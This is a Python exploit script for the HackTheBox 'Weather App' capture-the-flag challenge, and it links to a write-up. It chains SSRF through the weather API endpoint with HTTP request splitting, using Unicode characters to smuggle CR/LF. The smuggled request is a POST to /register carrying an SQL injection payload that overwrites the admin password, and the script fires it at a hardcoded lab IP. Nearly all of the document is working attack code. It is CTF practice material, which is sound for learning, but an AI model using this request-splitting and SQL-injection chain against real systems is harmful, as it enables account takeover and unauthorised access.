#!/usr/bin/env python3

# https://github.com/hacefresko/HTB-Web-WriteUps/blob/main/Weather%20App/Weather%20App.md

import requests

# import logging
# import http.client as http_client
# http_client.HTTPConnection.debuglevel = 1
# # You must initialize logging, otherwise you'll not see debug output.
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True

# def raw_get(url, port, endpoint = '/'):
#     if port != '':
#         host = f'{url}:{port}'
#     else:
#         host = f'{url}'
    
#     return f'GET {endpoint} HTTP/1.1\r\nHost: {host}\r\nConnection: Close\r\n\r\n'

# def raw_post_form(url, port, endpoint, body):
#     body_str = ''
#     for key, val in body.items():
#         body_str += f'{key}={val}&'
#     body_str = body_str[:-1]

#     if port != '':
#         referer = f'{url}:{port}{endpoint}'
#         host = f'{url}:{port}'
#     else:
#         referer = f'{url}{endpoint}'
#         host = f'{url}'
    
#     return f'POST {endpoint} HTTP/1.1\r\nHost: {host}\r\nAccept: *\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: {len(body_str)}\r\nReferer: {referer}\r\n\r\n{body_str}\r\n'

def ssrf_node(url, port, aditional_requests, endpoint = '/'):
    if port != '':
        host = f'{url}:{port}'
    else:
        host = f'{url}'
    
    return f'HTTP/1.1\r\nHost: {host}\r\n\r\n{aditional_requests}GET /?lol='

def raw_post_form2(url, port, endpoint, body_str):
    if port != '':
        referer = f'{url}:{port}{endpoint}'
        host = f'{url}:{port}'
    else:
        referer = f'{url}{endpoint}'
        host = f'{url}'
    
    return f'POST {endpoint} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body_str)}\r\n\r\n{body_str}\r\n\r\n'

ip = '188.166.156.174'
url = 'http://188.166.156.174:30649'

body = {
    'username': 'admin',
    'password': "1337') ON CONFLICT(username) DO UPDATE SET password = 'admin';--')"
}

body_str = ''
for key, val in body.items():
    body_str += f'{key}={val}&'
body_str = body_str[:-1]
body_str = body_str.replace('"', '%22')
body_str = body_str.replace("'", '%27')

print(body_str)

# raw_post = f'POST /register HTTP/1.1\r\nHost:127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {body_length}\r\n\r\n{body}\r\nConnection: Close\r\n\r\n'
# raw_post = 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: Close\r\n\r\n'
aditional_requests = raw_post_form2('127.0.0.1', '', '/register', body_str)

raw_post = ssrf_node('127.0.0.1', '', aditional_requests)

local_ip = '127.0.0.1/'
endpoint = local_ip + raw_post
endpoint = endpoint.replace('\r', '\u010D')
endpoint = endpoint.replace('\n', '\u010A')
endpoint = endpoint.replace(' ' , '\u0120')

# 127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=
# generated
# 127.0.0.1/ĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Type:Ġapplication/x-www-form-urlencodedčĊContent-Length:Ġ29čĊčĊusername=admin&password=adminčĊčĊGETĠ/?lol=

print(endpoint)

body = {
    "endpoint": endpoint, #'www.google.com/?lol=', # 'api.openweathermap.org',
    "city": "lol",
    "country": "lol"
}

res = requests.post(url + '/api/weather', json = body)
print(res.text)

# import socket

# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(('188.166.156.174', 30649))
# # s.sendall(raw_get('188.166.156.174', '30649').encode())
# # s.sendall(raw_post_form('188.166.156.174', '30649', '/login', body).encode())
# response = s.recv(4096)
# print(response)